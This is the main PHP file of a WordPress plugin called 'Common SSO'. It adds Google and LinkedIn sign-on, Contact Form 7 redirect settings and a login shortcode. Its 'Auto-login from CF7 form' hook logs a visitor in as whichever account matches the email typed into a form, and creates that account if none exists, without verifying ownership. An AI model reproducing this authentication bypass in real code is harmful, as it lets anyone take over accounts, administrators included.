<?php
/**
 * Plugin Name: Common SSO
 * Description: Enables LinkedIn and Google SSO with WooCommerce and Contact Form 7 session support.
 * Version: 1.0.0
 * Author: Commonwealth Creative
 */

define('COMMON_SSO_DIR', plugin_dir_path(__FILE__));
define('COMMON_SSO_URL', plugin_dir_url(__FILE__));

$opts = get_option('common_sso_settings') ?: [];

define('COMMON_SSO_LINKEDIN_CLIENT_ID', $opts['linkedin_client_id'] ?? '');
define('COMMON_SSO_LINKEDIN_CLIENT_SECRET', $opts['linkedin_client_secret'] ?? '');
define('COMMON_SSO_LINKEDIN_REDIRECT_URI', wp_login_url('?common_sso=1&provider=linkedin'));

define('COMMON_SSO_GOOGLE_CLIENT_ID', $opts['google_client_id'] ?? '');
define('COMMON_SSO_GOOGLE_CLIENT_SECRET', $opts['google_client_secret'] ?? '');
define('COMMON_SSO_GOOGLE_REDIRECT_URI', wp_login_url('?common_sso=1&provider=google'));

require_once COMMON_SSO_DIR . 'includes/oauth-handler.php';
require_once COMMON_SSO_DIR . 'includes/oauth-linkedin.php';
require_once COMMON_SSO_DIR . 'includes/oauth-google.php';
require_once COMMON_SSO_DIR . 'includes/user-sync.php';
require_once COMMON_SSO_DIR . 'includes/crypto.php';
require_once COMMON_SSO_DIR . 'includes/admin.php';
require_once COMMON_SSO_DIR . 'includes/logger.php';
require_once COMMON_SSO_DIR . 'includes/rest.php';

//*************************************************
// [Common SSO] – Contact Form 7 Redirect Settings
//*************************************************

/**
 * 1. Add a "Redirect Settings" panel in the CF7 form editor
 */
add_filter( 'wpcf7_editor_panels', 'common_sso_add_cf7_redirect_panel' );
function common_sso_add_cf7_redirect_panel( $panels ) {
    $panels['common-sso-redirect'] = array(
        'title'    => __( 'Redirect Settings', 'common-sso' ),
        'callback' => 'common_sso_cf7_redirect_panel_content',
    );
    return $panels;
}

function common_sso_cf7_redirect_panel_content( $contact_form ) {
    $form_id    = $contact_form->id();
    $enable_val = get_post_meta( $form_id, '_common_sso_enable_redirect', true );
    $url_val    = get_post_meta( $form_id, '_common_sso_redirect_url', true );
    wp_nonce_field( 'common_sso_cf7_redirect_save', 'common_sso_cf7_redirect_nonce' );
    ?>
    <h2><?php esc_html_e( 'Redirect Settings', 'common-sso' ); ?></h2>
    <fieldset>
      <label>
        <input type="checkbox"
               name="wpcf7-redirect-enable"
               value="1"
               <?php checked( $enable_val, '1' ); ?> />
        <?php esc_html_e( 'Enable Redirect on Submit', 'common-sso' ); ?>
      </label>
      <p>
        <label>
          <?php esc_html_e( 'Redirect URL:', 'common-sso' ); ?><br/>
          <input type="url"
                 name="wpcf7-redirect-url"
                 class="large-text code"
                 placeholder="https://example.com/thank-you"
                 value="<?php echo esc_attr( $url_val ); ?>" />
        </label>
      </p>
    </fieldset>
    <?php
}

/**
 * 2. Save the Redirect Settings when the CF7 form is saved
 */
add_action( 'save_post_wpcf7_contact_form', 'common_sso_save_cf7_redirect_settings' );
function common_sso_save_cf7_redirect_settings( $post_id ) {
    if ( ! isset( $_POST['common_sso_cf7_redirect_nonce'] ) ||
         ! wp_verify_nonce( $_POST['common_sso_cf7_redirect_nonce'], 'common_sso_cf7_redirect_save' ) ) {
        return;
    }
    if ( ! current_user_can( 'wpcf7_edit_contact_form', $post_id ) ) {
        return;
    }
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
        return;
    }

    $enable = isset( $_POST['wpcf7-redirect-enable'] ) ? '1' : '';
    update_post_meta( $post_id, '_common_sso_enable_redirect', $enable );

    if ( isset( $_POST['wpcf7-redirect-url'] ) ) {
        $url = sanitize_text_field( $_POST['wpcf7-redirect-url'] );
        update_post_meta( $post_id, '_common_sso_redirect_url', $url );
    }
}

/**
 * 3. Front-end JS: listen for CF7 Ajax submits and redirect
 */
add_action( 'wp_footer', 'common_sso_cf7_redirect_script' );
function common_sso_cf7_redirect_script() {
    $forms = get_posts( array(
        'post_type'   => 'wpcf7_contact_form',
        'meta_key'    => '_common_sso_enable_redirect',
        'meta_value'  => '1',
        'numberposts' => -1,
        'fields'      => 'ids',
    ) );
    if ( empty( $forms ) ) {
        return;
    }

    $redirect_map = array();
    foreach ( $forms as $form_id ) {
        $url = get_post_meta( $form_id, '_common_sso_redirect_url', true );
        if ( $url ) {
            $redirect_map[ $form_id ] = esc_url( $url );
        }
    }
    if ( empty( $redirect_map ) ) {
        return;
    }
    ?>
    <script>
    (function(){
        var cf7Redirects = <?php echo wp_json_encode( $redirect_map ); ?>;
        document.addEventListener('wpcf7mailsent', function(event) {
            var id = event.detail.contactFormId;
            if ( cf7Redirects[id] ) {
                window.location.href = cf7Redirects[id];
            }
        }, false);
    })();
    </script>
    <?php
}

/**
 * 4. PHP fallback redirect for non-JS submissions
 */
add_action( 'wpcf7_mail_sent', 'common_sso_cf7_redirect_on_mail_sent' );
function common_sso_cf7_redirect_on_mail_sent( $contact_form ) {
    $form_id      = $contact_form->id();
    $enabled      = get_post_meta( $form_id, '_common_sso_enable_redirect', true );
    $redirect_url = get_post_meta( $form_id, '_common_sso_redirect_url', true );

    if ( $enabled && $redirect_url ) {
        if ( ( defined('DOING_AJAX') && DOING_AJAX ) || ( defined('REST_REQUEST') && REST_REQUEST ) ) {
            return; // let JS handle Ajax submissions
        }
        wp_safe_redirect( esc_url_raw( $redirect_url ) );
        exit;
    }
}


// Enqueue front-end JS for form persistence
function common_sso_enqueue_scripts() {
    wp_enqueue_script(
        'common-sso-form-js',
        COMMON_SSO_URL . 'assets/sso-form-preserve.js',
        [],
        '1.0.0',
        true
    );
}
add_action('wp_enqueue_scripts', 'common_sso_enqueue_scripts');

// Auto-login from CF7 form
add_action('wpcf7_before_send_mail', function($contact_form) {
    $submission = WPCF7_Submission::get_instance();
    if (!$submission) return;

    $data = $submission->get_posted_data();
    $email = sanitize_email($data['your-email'] ?? '');

    if (!is_email($email)) return;

    $user = get_user_by('email', $email);
    if (!$user) {
        $random_password = wp_generate_password(12, false);
        $user_id = wp_create_user($email, $random_password, $email);
        $user = get_user_by('ID', $user_id);
    }

    if ($user && !is_wp_error($user)) {
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
    }
});

// Shortcode for login buttons and form
function common_sso_login_shortcode() {
    ob_start();

    $google_url   = esc_url(common_sso_get_auth_url('google'));
    $linkedin_url = esc_url(common_sso_get_auth_url('linkedin'));

    $opts    = get_option('common_sso_settings') ?: [];
    $form_id = $opts['common_sso_cf7_form_id'] ?? '';

    ?>
    <div class="common-sso-login-box">

        <?php if (!empty($form_id) && is_numeric($form_id)): ?>
            <div class="common-sso-alt-form">
                <?php echo do_shortcode('[contact-form-7 id="' . intval($form_id) . '"]'); ?>
            </div>
        <?php else: ?>
            <div class="common-sso-alt-form">
                <p><em>No alternate login form is configured. Please select a Contact Form 7 form in the plugin settings.</em></p>
            </div>
        <?php endif; ?>

        <div class="divider"><span class="textwhite">or</span></div>

        <a style="margin-left:10px;" href="<?php echo $google_url; ?>" class="pills bgwhite sso-button google">
            <span class="fa brands"></span> Continue with Google
        </a>

        <a style="margin-left:10px;"href="<?php echo $linkedin_url; ?>" class="pills bgwhite sso-button sso">
            <span class="fa brands" ></span> Continue with Linkedin
        </a>
    </div>

    <?php
    return ob_get_clean();
}

add_shortcode('common_sso_login', 'common_sso_login_shortcode');

// Redirect if user is already logged in and shortcode is present
add_action('template_redirect', function () {
    if (!is_user_logged_in()) return;

    global $post;
    if (is_a($post, 'WP_Post') && has_shortcode($post->post_content, 'common_sso_login')) {
        wp_redirect(home_url('/my-account/'));
        exit;
    }
});
